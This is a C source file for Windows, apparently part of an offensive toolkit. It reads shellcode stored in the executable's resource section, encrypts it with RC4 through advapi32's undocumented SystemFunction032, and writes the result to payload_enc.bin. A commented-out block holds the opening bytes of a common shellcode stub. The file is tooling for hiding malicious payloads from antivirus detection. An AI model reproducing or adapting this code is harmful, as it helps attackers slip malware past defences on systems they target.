#include "rc4.h"
#include "resource.h"

BOOL _CryptMemory032() {

    char func32[] = "SystemFunction032";

    HMODULE hAdvapi = LoadLibraryA("advapi32.dll");
    t_SystemFunction032 SystemFunction032 = (t_SystemFunction032)GetProcAddress(hAdvapi, func32);

    if (SystemFunction032)
        printf("++ Found %s ( 0x%p )\n", func32, SystemFunction032);

    // Encrypt ?
    // Shellcode from .rsrc
    HRSRC res = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_SCODE1), RT_RCDATA);
    HGLOBAL hRes = LoadResource(NULL, res);
    unsigned char* shellcode = (unsigned char*)LockResource(hRes);
    DWORD shellcodeSize = SizeofResource(NULL, res);

    //Shellcode as variable 
    /*
    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
        ....
    */

    //const char key[] = "LK8mT&9o3zShqrc#V2c%tZ^qM#VhQ7DY4QyUxnEQ&6C9zn7i#TD&6j%LTz9QB";
    CHAR key[] = { 'X','@','f','8','k','d','3','T','D','o','!','r','j','E' };
    ustring _data;
    ustring _key;

    PVOID scaddr = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("Allocated memory addr-> %p\n", scaddr);

    memmove(scaddr, shellcode, shellcodeSize);
    
    // For variable-based shellcode
    //
    //_data.Buffer = (PUCHAR)shellcode;
    //_data.Length = sizeof shellcode;

    // For .rsrc based shellcode from .bin file
    _data.Buffer = (PUCHAR)scaddr;
    _data.Length = shellcodeSize;

    _key.Buffer = (PUCHAR)&key;
    _key.Length = sizeof key;

    printf("Length-> %d\n\n", shellcodeSize);
    //printf("Addr shellcode-> SC: %p | _data: %p\n", shellcode, _data.Buffer);


    SystemFunction032(&_data, &_key);

    //
    // Remove below comments to get the HEX value of the encrypted shellcode !
    //

    printf("unsigned char buf[] = \"");

    SIZE_T i = 0;
    for (i; i < _data.Length; i++) {

        //printf("\\x%02x", _data.Buffer[i]);

    }
    //printf("\";\n");
    //printf("\n");

    // Stores the payload in the current folder as this executable
    wchar_t filename[] = L"payload_enc.bin";

    HANDLE hFile = CreateFileW(filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hFile) {
        printf("Failed creating the %ws file-> %d\n", filename, GetLastError());
    }
    printf("\n\nCreated %ws\n", filename);

    DWORD bytesWritten = 0;
    if (WriteFile(hFile, scaddr, shellcodeSize, &bytesWritten, NULL)) {
        printf("+ Wrote successfully !\n");
    }
    else {
        printf("- Error writing the file ! ( %d ) \n", GetLastError());
        return 1;
    }

    VirtualFree(scaddr, shellcodeSize, MEM_FREE);
    CloseHandle(hFile);

    FreeLibrary(hAdvapi);

    return 0;
}